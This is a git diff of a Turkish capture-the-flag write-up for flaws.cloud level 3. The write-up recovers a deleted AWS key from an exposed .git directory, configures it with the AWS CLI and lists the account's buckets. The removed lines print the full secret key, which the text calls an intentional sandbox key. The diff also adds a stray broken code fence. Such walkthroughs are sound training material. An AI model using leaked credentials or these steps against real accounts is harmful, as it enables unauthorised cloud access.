@@ -36,7 +36,7 @@ ls -la
 `authenticated_users.png` dosyalarının yanında, normalde bir web sitesi
 deploy'unda bulunmaması gereken bir **`.git/` dizini** görülüyor:
 
-![aws s3 sync ile bucket indirme, cd level3, ls -la çıktısında .git dizininin görülmesi](screenshots/level-3_terminal-5.png)
+![aws s3 sync ile bucket indirme, cd level3, ls -la çıktısında .git dizininin görülmesi](screenshots/level-3_terminal-1.png)
 
 **b) Commit geçmişinin incelenmesi**
 
@@ -66,8 +66,6 @@ have") tek başına şüphe uyandırıyor — bu, geliştiricinin bir hata yapı
 onu "düzelttiğini" (yani sildiğini) düşündüğü bir commit olduğuna işaret
 ediyor.
 
-![.git dizininin keşfi sonrası git --no-pager log çıktısı — iki commit ve "Oops, accidentally added something I shouldn't have" mesajı](screenshots/level-3_terminal-5.png)
-
 **c) `git show` ile diff'in alınması ve sızmış key'in ortaya çıkması**
 
 Şüpheli commit'in diff'i alındığında, silinen dosyanın adı ve eski içeriği
@@ -76,25 +74,7 @@ ediyor.
 ```bash
 git --no-pager show b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
 ```
-
-```
-commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
-Author: 0xdabbad00 <scott@summitroute.com>
-Date:   Sun Sep 17 09:10:43 2017 -0600
-
-    Oops, accidentally added something I shouldn't have
-
-diff --git a/access_keys.txt b/access_keys.txt
-deleted file mode 100644
-index e3ae6dd..0000000
---- a/access_keys.txt
-+++ /dev/null
-@@ -1,2 +0,0 @@
--access_key AKIAJ366LIPB4****** (redacted)
--secret_access_key 0dNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
-```
-
-![git --no-pager show ile diff — access_keys.txt dosyasının silinmeden önceki içeriği: access_key ve secret_access_key açıkça görünüyor](screenshots/level-3_terminal-4.png)
+![git --no-pager show ile diff — access_keys.txt dosyasının silinmeden önceki içeriği: access_key ve secret_access_key açıkça görünüyor](screenshots/level-3_terminal-2.png)
 
 Sızan kimlik bilgileri (flaws.cloud'un kasıtlı olarak eğitim amacıyla
 bıraktığı sandbox key'i, gerçek bir sızıntı değil — bu yüzden burada açıkça
@@ -111,14 +91,6 @@ adlandırılmış profile (`flaws3`) yüklendi:
 ```bash
 aws configure --profile flaws3
 ```
-
-```
-AWS Access Key ID [None]: AKIAJ366LIPB4****** (redacted)
-AWS Secret Access Key [None]: 0dNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
-Default region name [None]: us-west-2
-Default output format [None]: json
-```
-
 ![aws configure --profile flaws3 ile sızmış key ve secret'in ayrı bir profile girilmesi](screenshots/level-3_terminal-3.png)
 
 **e) Kimliğin doğrulanması**
@@ -130,16 +102,7 @@ kullanıcısına ait olduğunu gösteriyor:
 ```bash
 aws sts get-caller-identity --profile flaws3
 ```
-
-```json
-{
-    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
-    "Account": "975426262029",
-    "Arn": "arn:aws:iam::975426262029:user/backup"
-}
-```
-
-![aws sts get-caller-identity --profile flaws3 çıktısı — key'in 975426262029 hesabındaki user/backup kullanıcısına ait olduğunun doğrulanması](screenshots/level-3_terminal-2.png)
+![aws sts get-caller-identity --profile flaws3 çıktısı — key'in 975426262029 hesabındaki user/backup kullanıcısına ait olduğunun doğrulanması](screenshots/level-3_terminal-4.png)
 
 **f) Bu kimlikle hesabın tüm kaynaklarının görülmesi**
 
@@ -150,22 +113,10 @@ level'ların (level4, level5, level6) bucket'ları dahil:
 
 ```bash
 aws s3 ls --profile flaws3
+``
 ```
 
-```
-2026-04-28 14:44:51 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
-2026-04-28 14:31:10 config-bucket-975426262029
-2026-04-24 20:21:36 flaws-logs
-2026-04-28 16:20:23 flaws.cloud
-2026-04-25 00:54:29 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
-2026-04-27 17:14:25 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
-2026-04-27 23:28:40 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
-2026-04-27 23:05:20 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
-2026-04-24 22:33:12 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
-2026-04-25 00:46:53 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
-```
-
-![aws s3 ls --profile flaws3 çıktısı — sızmış key ile flaws hesabındaki TÜM bucket'ların (level4, level5, level6 dahil) listelenmesi](screenshots/level-3_terminal-1.png)
+![aws s3 ls --profile flaws3 çıktısı — sızmış key ile flaws hesabındaki TÜM bucket'ların (level4, level5, level6 dahil) listelenmesi](screenshots/level-3_terminal-5.png)
 
 Bu son adım, tek bir dosyaya (`access_keys.txt`) yazılmış, çevre
 değişkeni/rol yerine düz metin olarak saklanmış bir **long-term IAM
